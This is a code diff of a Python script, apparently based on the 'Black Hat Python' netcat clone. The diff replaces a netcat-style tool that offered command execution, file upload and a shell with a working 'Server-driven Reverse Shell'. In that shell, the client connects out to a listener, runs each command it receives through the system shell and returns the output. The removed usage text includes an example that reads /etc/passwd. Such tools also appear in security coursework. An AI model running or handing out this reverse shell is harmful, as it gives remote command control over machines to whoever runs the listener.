@@ -1,180 +1,131 @@
 import sys
 import socket
 import getopt
-import threading
 import subprocess
 
-# Global variables to store options
+# Global variables
 listen = False
-command = False
-upload = False
-execute = ""
 target = ""
-upload_destination = ""
 port = 0
 
 
 def run_command(cmd):
-    """Executes a command on the system and returns the output."""
-    cmd = cmd.rstrip()
-
+    """Execute a command locally and return output."""
+    cmd = cmd.strip()
+    if not cmd:
+        return b""
     try:
         output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
     except subprocess.CalledProcessError as e:
         output = e.output
-
     return output
 
 
-def client_handler(client_socket):
-    """Handles incoming client connections."""
-    global upload
-    global execute
-    global command
-
-    # Check if an upload destination is specified
-    if len(upload_destination):
-        file_buffer = b""
-
+def client_loop():
+    """Client connects to server, receives commands, executes, and returns output."""
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        client.connect((target, port))
         while True:
-            data = client_socket.recv(1024)
-            if not data:
-                break
-            else:
-                file_buffer += data
-
-        try:
-            with open(upload_destination, "wb") as file_descriptor:
-                file_descriptor.write(file_buffer)
-            client_socket.send(f"Successfully saved file to {upload_destination}".encode())
-        except OSError as e:
-            client_socket.send(f"Failed to save file to {upload_destination} due to OS Error. Details: {e}".encode())
-
-    # Check if a command should be executed
-    if len(execute):
-        output = run_command(execute)
-        client_socket.send(output)
-
-    # If command shell mode is enabled
-    if command:
-        while True:
-            client_socket.send(b"<BHP:#> ")
+            # Receive command from server
             cmd_buffer = b""
             while b"\n" not in cmd_buffer:
-                cmd_buffer += client_socket.recv(1024)
-            response = run_command(cmd_buffer.decode())
-            client_socket.send(response)
+                data = client.recv(1024)
+                if not data:
+                    return  # server closed connection
+                cmd_buffer += data
+
+            cmd = cmd_buffer.decode().strip()
+            if cmd.lower() in ("exit", "quit"):
+                break
+
+            # Execute command and send output back
+            output = run_command(cmd)
+            if not output:
+                output = b"[+] Command executed.\n"
+            client.send(output)
+    except Exception as e:
+        print(f"[*] Connection error: {e}")
+    finally:
+        client.close()
 
 
 def server_loop():
-    """Starts a server and listens for incoming connections."""
+    """Server listens for clients and sends commands."""
     global target
-    global port
-
-    if not len(target):
-        target = "0.0.0.0"  # Listen on all available interfaces
+    if not target:
+        target = "0.0.0.0"
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((target, port))
     server.listen(5)
+    print(f"[*] Listening on {target}:{port}")
+
+    client_socket, addr = server.accept()
+    print(f"[+] Client connected from {addr[0]}:{addr[1]}")
 
     while True:
-        client_socket, addr = server.accept()
-        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
-        client_thread.start()
+        try:
+            cmd = input("> ")
+            if not cmd:
+                continue
+            cmd += "\n"
+            client_socket.send(cmd.encode())
 
-
-def client_sender(buffer):
-    """Sends data to a remote server and starts interactive shell immediately."""
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        client.connect((target, port))
-
-        # If we passed initial data (like a piped file), send it first
-        if len(buffer):
-            client.send(buffer.encode())
-
-        while True:
-            # Now we wait for data back from the server
-            recv_len = 1
+            # Receive response
             response = b""
-
-            while recv_len:
-                data = client.recv(4096)
-                recv_len = len(data)
+            while True:
+                data = client_socket.recv(4096)
                 response += data
-                if recv_len < 4096:
+                if len(data) < 4096:
                     break
+            print(response.decode(), end="")
 
-            if response:
-                print(response.decode(), end="")
+            if cmd.strip().lower() in ("exit", "quit"):
+                print("[*] Closing connection")
+                client_socket.close()
+                break
 
-            # Get user input for the next command
-            buffer = input("")
-            buffer += "\n"
-            client.send(buffer.encode())
-
-    except socket.error as e:
-        print("[*] Connection closed or error occurred.")
-        client.close()
+        except Exception as e:
+            print(f"[*] Error: {e}")
+            client_socket.close()
+            break
 
 
-def usage_info():
-    """Displays usage information for the script."""
-    print("Netcat Replacement")
-    print("Usage: bhp_net.py -t target_host -p port")
-    print("-l --listen                  - Listen for incoming connections")
-    print("-e --execute=file_to_run     - Execute a file upon receiving a connection")
-    print("-c --command                 - Initialize a command shell")
-    print("-u --upload=destination      - Upload a file and write it to [destination]")
-    print("Examples:")
-    print("bhp_net.py -t 192.168.0.1 -p 555 -l -c")
-    print("bhp_net.py -t 192.168.0.1 -p 555 -l -u=c:\\target.exe")
-    print("bhp_net.py -t 192.168.0.1 -p 555 -l -e=\"cat /etc/passwd\"")
-    print("echo 'ABCDEFGHI' | ./bhp_net.py -t 192.168.11.12 -p 135")
+def usage():
+    print("Server-driven Reverse Shell")
+    print("Usage:")
+    print("  Server: bhp_net.py -l -p port")
+    print("  Client: bhp_net.py -t server_ip -p port")
     sys.exit()
 
 
 def main():
-    global listen, port, execute, command, upload_destination, target
+    global listen, target, port
 
     if not len(sys.argv[1:]):
-        usage_info()
+        usage()
 
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
-                                   ["help", "listen", "execute=", "target=", "port=", "command", "upload="])
+        opts, args = getopt.getopt(
+            sys.argv[1:], "hlt:p:", ["help", "listen", "target=", "port="]
+        )
         for o, a in opts:
             if o in ("-h", "--help"):
-                usage_info()
+                usage()
             elif o in ("-l", "--listen"):
                 listen = True
-            elif o in ("-e", "--execute"):
-                execute = a
-            elif o in ("-c", "--command"):
-                command = True
-            elif o in ("-u", "--upload"):
-                upload_destination = a
             elif o in ("-t", "--target"):
                 target = a
             elif o in ("-p", "--port"):
                 port = int(a)
     except getopt.GetoptError:
-        usage_info()
-
-    if not listen and len(target) and port > 0:
-        # REMOVED: sys.stdin.read()
-        # We now pass an empty string unless data is being piped in
-        if not sys.stdin.isatty():
-            buffer = sys.stdin.read()
-        else:
-            buffer = ""
-
-        client_sender(buffer)
+        usage()
 
     if listen:
         server_loop()
+    else:
+        client_loop()
 
 
 if __name__ == "__main__":
